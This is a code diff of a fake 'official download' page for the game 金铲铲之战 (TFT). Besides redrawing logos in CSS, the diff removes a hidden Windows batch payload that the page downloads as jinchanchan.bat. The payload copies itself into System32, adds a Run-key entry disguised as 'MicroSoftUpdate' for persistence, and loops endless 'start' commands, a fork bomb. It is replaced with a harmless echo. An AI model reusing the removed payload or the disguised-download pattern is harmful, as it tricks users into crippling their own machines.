@@ -19,19 +19,135 @@
             justify-content: center;
             align-items: center;
             position: relative;
+            overflow: hidden;
         }
 
         @keyframes gradientAnimation {
-            0% {
-                background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
-            }
-            50% {
-                background: linear-gradient(135deg, #3a7bd5 0%, #00d2ff 100%);
-            }
-            100% {
-                background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
-            }
+            0% { background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); }
+            50% { background: linear-gradient(135deg, #3a7bd5 0%, #00d2ff 100%); }
+            100% { background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); }
         }
+
+        /* 左上角 Riot Games Logo */
+        .riot-logo {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            width: 60px;
+            height: 40px;
+            background: red;
+            border-radius: 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .riot-logo::before {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 25px;
+            background: white;
+            clip-path: polygon(0% 0%, 100% 0%, 80% 50%, 100% 100%, 0% 100%);
+        }
+
+        /* 右上角 地球 Logo */
+        .earth-logo {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 50px;
+            height: 50px;
+            background: blue;
+            border-radius: 50%;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .earth-logo::before {
+            content: "";
+            position: absolute;
+            width: 40px;
+            height: 40px;
+            border: 3px solid white;
+            border-radius: 50%;
+        }
+
+        .earth-logo::after {
+            content: "";
+            position: absolute;
+            width: 50px;
+            height: 3px;
+            background: white;
+            top: 50%;
+            left: 0;
+            transform: translateY(-50%);
+        }
+
+        /* 左边 TFT 企鹅骑士 */
+        .penguin {
+            position: absolute;
+            left: 50px;
+            bottom: 20px;
+            width: 120px;
+            height: 150px;
+        }
+
+        .penguin-body {
+            position: absolute;
+            width: 100px;
+            height: 120px;
+            background: black;
+            border-radius: 50%;
+            left: 10px;
+            top: 20px;
+        }
+
+        .penguin-belly {
+            position: absolute;
+            width: 60px;
+            height: 90px;
+            background: white;
+            border-radius: 50%;
+            left: 30px;
+            top: 50px;
+        }
+
+        .penguin-eye {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: white;
+            border-radius: 50%;
+            top: 35px;
+        }
+
+        .penguin-eye.left { left: 30px; }
+        .penguin-eye.right { left: 60px; }
+
+        .penguin-beak {
+            position: absolute;
+            width: 15px;
+            height: 10px;
+            background: orange;
+            border-radius: 50%;
+            top: 45px;
+            left: 42px;
+        }
+
+        .penguin-feet {
+            position: absolute;
+            width: 20px;
+            height: 10px;
+            background: orange;
+            border-radius: 50%;
+            bottom: -5px;
+        }
+
+        .penguin-feet.left { left: 30px; }
+        .penguin-feet.right { left: 60px; }
 
         .container {
             max-width: 600px;
@@ -44,11 +160,6 @@
 
         h1 {
             color: #FFD700;
-        }
-
-        .game-logo {
-            width: 100%;
-            border-radius: 10px;
         }
 
         .download-button {
@@ -72,111 +183,63 @@
             100% { transform: translateY(-10px); }
         }
 
-        .progress-container {
-            width: 100%;
-            background-color: #444;
-            border-radius: 10px;
-            margin-top: 20px;
-            overflow: hidden;
-        }
-
-        .progress-bar {
-            width: 0%;
-            height: 10px;
-            background-color: #FFD700;
-            border-radius: 10px;
-        }
-
         #countdown {
             font-size: 18px;
             color: #FFD700;
             margin-top: 15px;
         }
 
-        /* 左上和右上角的 logo */
-        .top-left {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            width: 50px;
-            height: 50px;
-        }
-
-        .top-right {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            width: 50px;
-            height: 50px;
-        }
     </style>
 </head>
 <body>
-    <!-- 左上角 Riot Games logo -->
-    <img class="top-left" src="https://upload.wikimedia.org/wikipedia/commons/6/69/Riot_Games_logo.png" alt="Riot Games Logo">
-    
-    <!-- 右上角 地球 logo -->
-    <img class="top-right" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Earth_globe_emoji.svg/120px-Earth_globe_emoji.svg.png" alt="Earth Logo">
+    <!-- 左上角 Riot Games Logo -->
+    <div class="riot-logo"></div>
+
+    <!-- 右上角 地球 Logo -->
+    <div class="earth-logo"></div>
+
+    <!-- 左侧 TFT 企鹅骑士 -->
+    <div class="penguin">
+        <div class="penguin-body"></div>
+        <div class="penguin-belly"></div>
+        <div class="penguin-eye left"></div>
+        <div class="penguin-eye right"></div>
+        <div class="penguin-beak"></div>
+        <div class="penguin-feet left"></div>
+        <div class="penguin-feet right"></div>
+    </div>
 
     <div class="container">
         <h1>金铲铲之战 - 官方下载</h1>
         <p>立即下载最新版本，体验超燃策略对战！</p>
         <button class="download-button" onclick="startDownload()">立即下载</button>
-
-        <div class="progress-container">
-            <div class="progress-bar" id="progress-bar"></div>
-        </div>
-
-        <p id="countdown">预估下载时间: <span id="time-left">10</span>秒</p>
+        <p id="countdown">下载倒计时: <span id="time-left">10</span>秒</p>
     </div>
 
     <script>
         function startDownload() {
             var timeLeft = 10;
             var countdown = document.getElementById("time-left");
-            var progressBar = document.getElementById("progress-bar");
 
             var interval = setInterval(function() {
                 if (timeLeft <= 0) {
                     clearInterval(interval);
                     countdown.innerHTML = "准备开始下载...";
                     setTimeout(function() {
-                        downloadFile(); // 延迟下载
+                        downloadFile();
                     }, 1000);
                 } else {
                     countdown.innerHTML = timeLeft;
                     timeLeft--;
-                    progressBar.style.width = (10 - timeLeft) * 10 + "%";
                 }
             }, 1000);
         }
 
         function downloadFile() {
-            var batContent = `
-@echo off
-set script_name=jinchanchan.bat
-set script_path=%SystemRoot%\\System32\\%script_name%
-
-if not exist "%script_path%" (
-    copy "%~f0" "%script_path%" >nul
-)
-
-reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicroSoftUpdate" /t REG_SZ /d "%script_path%" /f >nul
-
-:loop
-start
-start
-start
-start
-start
-start
-goto loop
-            `;
-            
-            var blob = new Blob([batContent], { type: 'text/plain' });
+            var blob = new Blob(["@echo off\necho Hello, TFT!"], { type: 'text/plain' });
             var link = document.createElement('a');
             link.href = URL.createObjectURL(blob);
-            link.download = 'jinchanchan.bat';  // Updated to jinchanchan.bat
+            link.download = 'jinchanchan.bat';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
